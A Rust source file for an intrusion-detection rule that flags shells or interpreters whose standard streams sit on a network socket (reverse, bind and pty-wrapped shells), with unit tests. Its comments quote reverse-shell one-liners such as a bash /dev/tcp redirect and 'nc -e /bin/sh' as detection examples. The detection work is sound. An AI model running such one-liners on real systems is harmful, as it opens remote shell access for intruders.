//! R020 — Shell or interpreter with its standard streams on a network
//! socket (lab PR 224, CM-03).
//!
//! MITRE T1059.004 (Command and Scripting Interpreter: Unix Shell) for the
//! shell, T1095 (Non-Application Layer Protocol) for its channel — ATT&CK
//! 20.0 ids of the pinned `docs/detection/attack-enterprise-20.0.tsv`
//! ([`Rule::attack`]).
//!
//! A reverse shell is a shell whose input and output are the network:
//! `bash -i >& /dev/tcp/host/port 0>&1`, `nc -e /bin/sh`, `socat …
//! EXEC:bash`, the Perl, Python, PHP and Ruby one-liners. The tools vary;
//! the shell's file table does not. The exec sensor reads, at
//! `sched_process_exec`, which of the new image's fds 0..2 are `AF_INET`
//! / `AF_INET6` sockets, whether one of them was connected out by a local
//! process (the connect kprobe recorded its socket), and the same for the
//! exec'ing task's parent (`Event::ProcessSpawn::stdio`).
//!
//! The rule fires, Critical, on an exec whose image
//! (by what the kernel executed, never `comm`) is a shell or an
//! interpreter ([`SHELLS`], [`INTERPRETERS`]) and:
//!
//! 1. its stdin or stdout is an inet socket connected out — the reverse
//!    shell, whatever its parent;
//! 2. its stdin or stdout is an inet socket not seen connecting out (an
//!    accepted one: a bind shell; or a connect older than the agent),
//!    unless it was handed over by an inetd-style launcher: the parent is
//!    PID 1 (systemd socket activation, `Accept=yes`) or a launcher by
//!    exec identity ([`LAUNCHERS`]), or the parent's own stdio is the same
//!    kind of accepted socket (a socket-activated script running its
//!    commands);
//! 3. it is a shell, and its parent's stdin or stdout is an inet socket
//!    connected out — the reverse shell wrapped in a pty: the parent
//!    connected, `dup2`'d the socket onto 0..2 and spawned the shell on a
//!    pseudo-terminal (`pty.spawn`, `script`), so the shell's own fds are
//!    the pty.
//!
//! Its response, `KillProcessTree`, is held behind the per-rule response
//! policy ([`response_policy::R020_KILL`], off by default, decision of
//! 21/10/2026): until that policy enables it the verdict is a Critical
//! record, action `Log`, with the posture's `ConfirmedIntrusion`.
//!
//! The operator's `process-comm-allowlist` exempts a program, judged on
//! exec identity, as for R006/R007.
//!
//! Not covered (said so): an interpreter that `dup2`s a socket onto its
//! own stdio and runs no new image (a Python REPL over the socket); a
//! bind shell re-parented to PID 1 before its exec (double fork) — its
//! listener is still NN-L-NET-006/019's; a socket that is not on fds 0..2
//! (`socat` keeps it on its own fd and copies). A connect made before the
//! agent started is read as "not seen connecting out" (case 2).

use std::net::SocketAddr;
use std::sync::Arc;

use common::{Event, ResponseAction, Severity, StdioSocket, Verdict};

use crate::config::comm_allowlist::{CommAllowlist, Judgement};
use crate::decision::attack::{AttackRef, Tactic};
use crate::decision::response_policy::{self, PolicySwitch};
use crate::decision::rules::transfer_tools::program_is;
use crate::decision::{rules::build_verdict, Rule};
use crate::posture::lineage::AuthSessionTracker;

/// Shells, by the basename of the executed file (a version suffix
/// allowed: `ksh93`).
pub const SHELLS: &[&str] = &[
    "sh", "bash", "rbash", "dash", "ash", "zsh", "ksh", "mksh", "pdksh", "yash", "csh", "tcsh",
    "fish",
];

/// Interpreters a reverse shell is written in.
pub const INTERPRETERS: &[&str] = &[
    "python", "python2", "python3", "pypy", "pypy3", "perl", "ruby", "irb", "php", "lua", "luajit",
    "node", "nodejs", "deno", "tclsh", "wish", "expect", "pwsh",
];

/// Programs that hand an accepted connection to a service on its stdio
/// (inetd style). PID 1 counts as systemd without a lookup.
pub const LAUNCHERS: &[&str] = &[
    "systemd",
    "inetd",
    "xinetd",
    "tcpserver",
    "s6-tcpserver",
    "s6-tcpserver4",
    "s6-tcpserver6",
    "tcpsvd",
    "in.rshd",
    "in.rexecd",
];

/// Applets busybox runs as a shell (`argv[0]`).
const BUSYBOX_SHELLS: &[&str] = &["sh", "ash", "hush", "bash"];

fn base_of(path: &str) -> &str {
    path.rsplit('/').next().unwrap_or(path)
}

/// What the kernel executed is a shell (`true`) or an interpreter
/// (`false`); `None` for anything else.
fn shell_or_interpreter(image: &str, argv: &[String]) -> Option<bool> {
    let base = base_of(image);
    if SHELLS.iter().any(|s| program_is(base, s)) {
        return Some(true);
    }
    if base == "busybox" {
        let applet = argv.first().map(|a| base_of(a)).unwrap_or("");
        if BUSYBOX_SHELLS.contains(&applet) {
            return Some(true);
        }
    }
    INTERPRETERS
        .iter()
        .any(|s| program_is(base, s))
        .then_some(false)
}

/// Which of the three shapes (module docs) an exec has.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum StdioShellShape {
    /// Case 1: own stdin/stdout on a socket connected out.
    Outbound,
    /// Case 2: own stdin/stdout on a socket not seen connecting out, from
    /// a parent that is no launcher.
    NotLaunched,
    /// Case 3: a shell whose parent's stdin/stdout is a socket connected
    /// out.
    ParentOutbound,
}

impl StdioShellShape {
    /// For the detection record's `network` field.
    pub fn direction(&self) -> &'static str {
        match self {
            Self::Outbound | Self::ParentOutbound => "outbound",
            Self::NotLaunched => "inbound",
        }
    }
}

/// The shape of a `ProcessSpawn`, `None` when it is none of them.
/// `lineage` names the parent (the inetd-launcher exemption); without it
/// only PID 1 counts as a launcher.
pub fn shape(event: &Event, lineage: Option<&AuthSessionTracker>) -> Option<StdioShellShape> {
    let Event::ProcessSpawn {
        ppid,
        filename,
        exe,
        argv,
        stdio,
        ..
    } = event
    else {
        return None;
    };
    if !stdio.own.stdin_or_stdout_inet() && !stdio.parent.stdin_or_stdout_inet() {
        return None;
    }
    let is_shell = shell_or_interpreter(exe.path_or(filename), argv)?;
    if stdio.own.stdin_or_stdout_inet() {
        if stdio.own.outbound {
            return Some(StdioShellShape::Outbound);
        }
        if *ppid == 1
            || parent_is_launcher(*ppid, lineage)
            || (stdio.parent.stdin_or_stdout_inet() && !stdio.parent.outbound)
        {
            return None;
        }
        return Some(StdioShellShape::NotLaunched);
    }
    (is_shell && stdio.parent.outbound).then_some(StdioShellShape::ParentOutbound)
}

fn parent_is_launcher(ppid: u32, lineage: Option<&AuthSessionTracker>) -> bool {
    let Some(id) = lineage.and_then(|l| l.exec_identity(ppid)) else {
        return false;
    };
    crate::posture::lineage::in_system_tree(&id.exe.to_string_lossy())
        && LAUNCHERS
            .iter()
            .any(|l| program_is(base_of(&id.exe.to_string_lossy()), l))
}

/// `stdio tcp 127.0.0.1:44401 outbound`, for the detection record and the
/// reasoning: the socket the shape was read on.
pub fn network_text(event: &Event, shape: StdioShellShape) -> Option<String> {
    let Event::ProcessSpawn { stdio, .. } = event else {
        return None;
    };
    let (label, sock): (&str, &StdioSocket) = match shape {
        StdioShellShape::ParentOutbound => ("parent-stdio", &stdio.parent),
        _ => ("stdio", &stdio.own),
    };
    Some(format!(
        "{label} {} {} {}",
        sock.proto_name(),
        peer_text(sock.peer),
        shape.direction()
    ))
}

fn peer_text(peer: Option<SocketAddr>) -> String {
    peer.map_or_else(|| "?".to_string(), |p| p.to_string())
}

pub struct R020ShellWithSocketStdio {
    allowlist: Arc<CommAllowlist>,
    lineage: Option<AuthSessionTracker>,
    /// The kill of the tree, held behind the per-rule policy
    /// ([`response_policy::R020_KILL`], off by default): Critical, recorded,
    /// posture `ConfirmedIntrusion`, action `Log`.
    kill: PolicySwitch,
}

impl R020ShellWithSocketStdio {
    pub fn new(allowlist: Arc<CommAllowlist>, lineage: Option<AuthSessionTracker>) -> Self {
        Self {
            allowlist,
            lineage,
            kill: response_policy::R020_KILL,
        }
    }

    /// This rule with its kill switch set to `kill` (tests; the per-rule
    /// policy in Phase 2).
    pub fn with_kill(self, kill: PolicySwitch) -> Self {
        Self { kill, ..self }
    }
}

impl Rule for R020ShellWithSocketStdio {
    fn id(&self) -> &'static str {
        "R020_ShellWithSocketStdio"
    }
    fn name(&self) -> &'static str {
        "Shell or interpreter with stdin/stdout on a network socket"
    }
    fn category(&self) -> &'static str {
        "execution"
    }
    fn attack(&self) -> &'static [AttackRef] {
        // A shell on a network socket: the shell, and the raw channel its
        // standard streams are (as R006).
        const ATTACK: &[AttackRef] = &[
            AttackRef::new(Tactic::Execution, "T1059.004"),
            AttackRef::new(Tactic::CommandAndControl, "T1095"),
        ];
        ATTACK
    }

    fn evaluate(&self, event: &Event) -> Option<Verdict> {
        let shape = shape(event, self.lineage.as_ref())?;
        if super::judge_spawn(&self.allowlist, event) == Judgement::Allowed {
            return None;
        }
        let Event::ProcessSpawn {
            filename,
            exe,
            stdio,
            ..
        } = event
        else {
            return None;
        };
        let image = exe.path_or(filename);
        let reasoning = match shape {
            StdioShellShape::Outbound => format!(
                "{image} started with stdin/stdout on a {} socket it or an ancestor connected \
                 out to {} — a reverse shell (T1059.004; channel T1095); kill the process \
                 tree",
                stdio.own.proto_name(),
                peer_text(stdio.own.peer)
            ),
            StdioShellShape::NotLaunched => format!(
                "{image} started with stdin/stdout on a {} socket (peer {}) not seen \
                 connecting out and not handed over by an inetd-style launcher — a bind shell, \
                 or a reverse shell connected before the agent started (T1059.004); kill the \
                 process tree",
                stdio.own.proto_name(),
                peer_text(stdio.own.peer)
            ),
            StdioShellShape::ParentOutbound => format!(
                "shell {image} spawned by a process whose stdin/stdout is a {} socket connected \
                 out to {} — a reverse shell wrapped in a pseudo-terminal (the socket dup2'd \
                 onto the parent's stdio, T1059.004); kill the process tree",
                stdio.parent.proto_name(),
                peer_text(stdio.parent.peer)
            ),
        };
        Some(self.kill.hold(build_verdict(
            self,
            event,
            ResponseAction::KillProcessTree,
            Severity::Critical,
            &reasoning,
        )))
    }
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::decision::rules::testutil::spawn_exe;
    use common::{StdioSocket, StdioSockets};

    fn sock(outbound: bool, fds: u8, peer: &str) -> StdioSocket {
        StdioSocket {
            read: true,
            inet_fds: fds,
            outbound,
            proto: 6,
            peer: Some(peer.parse().unwrap()),
        }
    }

    fn with_stdio(mut e: Event, own: StdioSocket, parent: StdioSocket, ppid: u32) -> Event {
        if let Event::ProcessSpawn { stdio, ppid: p, .. } = &mut e {
            *stdio = StdioSockets { own, parent };
            *p = ppid;
        }
        e
    }

    fn rule() -> R020ShellWithSocketStdio {
        R020ShellWithSocketStdio::new(Arc::new(CommAllowlist::default()), None)
    }

    fn bash() -> Event {
        spawn_exe("bash", "/bin/bash", "/usr/bin/bash", 0)
    }

    /// MS-06: `bash -i >& /dev/tcp/127.0.0.1/44401 0>&1` — the shell's
    /// stdio is the socket its parent connected.
    #[test]
    fn a_shell_on_an_outbound_socket_is_a_critical_reverse_shell() {
        let e = with_stdio(
            bash(),
            sock(true, 0b111, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        let v = rule().evaluate(&e).expect("fires");
        assert_eq!(v.rule_id, "R020_ShellWithSocketStdio");
        assert_eq!(v.severity, Severity::Critical);
        // The kill is held behind the per-rule policy, off by default.
        assert_eq!(v.action, ResponseAction::Log);
        assert!(
            v.reasoning.contains("[held back: the kill"),
            "{}",
            v.reasoning
        );
        assert!(v.reasoning.contains("127.0.0.1:44401"), "{}", v.reasoning);
        // With the switch on (Phase 2's per-rule policy), the tree is killed.
        let on = rule().with_kill(response_policy::R020_KILL.enabled());
        let k = on.evaluate(&e).expect("fires");
        assert_eq!(k.action, ResponseAction::KillProcessTree);
        assert!(!k.reasoning.contains("held back"), "{}", k.reasoning);
        assert_eq!(
            network_text(&e, shape(&e, None).unwrap()).as_deref(),
            Some("stdio tcp 127.0.0.1:44401 outbound")
        );
        // Even from PID 1 (a double fork): the socket was connected out.
        let e = with_stdio(
            bash(),
            sock(true, 0b011, "127.0.0.1:44401"),
            StdioSocket::default(),
            1,
        );
        assert!(rule().evaluate(&e).is_some());
    }

    /// The same on the starting tree's record shape: no stdio read, no
    /// verdict (the exec sensor of an older eBPF object).
    #[test]
    fn an_unread_file_table_is_never_a_socket() {
        let e = bash();
        assert!(rule().evaluate(&e).is_none());
        let mut unread = sock(true, 0b111, "127.0.0.1:1");
        unread.read = false;
        let e = with_stdio(bash(), unread, StdioSocket::default(), 4000);
        assert!(rule().evaluate(&e).is_none());
    }

    /// stderr alone on a socket is not the shell's input or output.
    #[test]
    fn stderr_alone_is_not_enough() {
        let e = with_stdio(
            bash(),
            sock(true, 0b100, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        assert!(rule().evaluate(&e).is_none());
    }

    /// MS-06N: systemd `Accept=yes` hands the accepted socket to the
    /// service (PID 1 its parent), and the service's script runs commands
    /// with the socket inherited: neither fires. A bind shell from `nc`
    /// does.
    #[test]
    fn an_inetd_style_service_is_not_a_bind_shell_a_bind_shell_is() {
        let inbound = sock(false, 0b011, "127.0.0.1:52000");
        let launched = with_stdio(bash(), inbound, StdioSocket::default(), 1);
        assert!(rule().evaluate(&launched).is_none());
        let script_child = with_stdio(
            spawn_exe("python3", "/usr/bin/python3", "/usr/bin/python3.12", 0),
            inbound,
            inbound,
            5000,
        );
        assert!(rule().evaluate(&script_child).is_none());
        let bind = with_stdio(bash(), inbound, StdioSocket::default(), 5000);
        let v = rule().evaluate(&bind).expect("a bind shell fires");
        assert_eq!(v.severity, Severity::Critical);
        assert_eq!(
            network_text(&bind, shape(&bind, None).unwrap()).as_deref(),
            Some("stdio tcp 127.0.0.1:52000 inbound")
        );
    }

    /// An inetd launcher by exec identity exempts its accepted socket.
    #[test]
    fn a_launcher_parent_by_identity_exempts_an_accepted_socket() {
        let tmp = tempfile::TempDir::new().unwrap();
        let l = AuthSessionTracker::new(tmp.path());
        l.ingest_spawn_with_argv(6000, 1, "/usr/sbin/xinetd", &["/usr/sbin/xinetd".into()], 1);
        let r = R020ShellWithSocketStdio::new(Arc::new(CommAllowlist::default()), Some(l));
        let e = with_stdio(
            bash(),
            sock(false, 0b011, "127.0.0.1:52000"),
            StdioSocket::default(),
            6000,
        );
        assert!(r.evaluate(&e).is_none());
    }

    /// MS-06B: Python connects, dup2's the socket onto 0..2 and spawns
    /// `/bin/sh` on a pty: the shell's parent holds the socket.
    #[test]
    fn a_pty_wrapped_reverse_shell_fires_on_the_shell() {
        let e = with_stdio(
            spawn_exe("sh", "/bin/sh", "/usr/bin/dash", 0),
            StdioSocket {
                read: true,
                ..Default::default()
            },
            sock(true, 0b111, "127.0.0.1:44402"),
            7000,
        );
        let v = rule().evaluate(&e).expect("fires");
        assert!(v.reasoning.contains("pseudo-terminal"), "{}", v.reasoning);
        assert_eq!(
            network_text(&e, shape(&e, None).unwrap()).as_deref(),
            Some("parent-stdio tcp 127.0.0.1:44402 outbound")
        );
        // An interpreter child of such a parent is not this shape.
        let e = with_stdio(
            spawn_exe("python3", "/usr/bin/python3", "/usr/bin/python3.12", 0),
            StdioSocket::default(),
            sock(true, 0b111, "127.0.0.1:44402"),
            7000,
        );
        assert!(rule().evaluate(&e).is_none());
    }

    /// The image is what the kernel executed: a program named `bash` is
    /// not a shell, `/usr/bin/perl` is an interpreter, busybox's `sh` is a
    /// shell; `cat` on a socket (an inetd echo service) is none.
    #[test]
    fn the_image_decides_not_the_comm() {
        let out = sock(true, 0b011, "127.0.0.1:44401");
        let none = StdioSocket::default();
        let fake = with_stdio(
            spawn_exe("bash", "/usr/bin/cat", "/usr/bin/cat", 0),
            out,
            none,
            9,
        );
        assert!(rule().evaluate(&fake).is_none());
        let perl = with_stdio(
            spawn_exe("x", "/usr/bin/perl", "/usr/bin/perl5.38", 0),
            out,
            none,
            9,
        );
        assert!(rule().evaluate(&perl).is_some());
        let mut bb = with_stdio(
            spawn_exe("sh", "/bin/sh", "/usr/bin/busybox", 0),
            out,
            none,
            9,
        );
        if let Event::ProcessSpawn { argv, .. } = &mut bb {
            *argv = vec!["sh".into(), "-i".into()];
        }
        assert!(rule().evaluate(&bb).is_some());
    }

    /// The operator's allowlist exempts a program by identity.
    #[test]
    fn the_process_allowlist_exempts_by_identity() {
        let r = R020ShellWithSocketStdio::new(
            Arc::new(CommAllowlist::from_iter_owned(["bash".to_string()])),
            None,
        );
        let e = with_stdio(
            bash(),
            sock(true, 0b011, "127.0.0.1:44401"),
            StdioSocket::default(),
            4000,
        );
        assert!(r.evaluate(&e).is_none());
    }
}
